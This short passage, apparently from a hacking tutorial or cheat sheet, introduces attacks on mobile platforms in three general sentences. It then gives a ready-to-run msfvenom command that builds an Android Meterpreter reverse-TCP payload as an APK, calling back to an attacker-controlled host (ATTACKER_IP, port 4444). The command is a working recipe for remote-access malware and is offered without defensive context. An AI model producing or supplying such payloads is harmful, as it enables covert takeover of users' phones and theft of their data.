Hacking mobile platforms involves exploiting vulnerabilities in mobile operating systems, applications, and networks.

This can lead to unauthorized access, data breaches, and other security incidents.

Mobile platforms are often less secure than traditional computing platforms, making them a common target for attackers.

```bash
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=ATTACKER_IP LPORT=4444 -o payload.apk
```
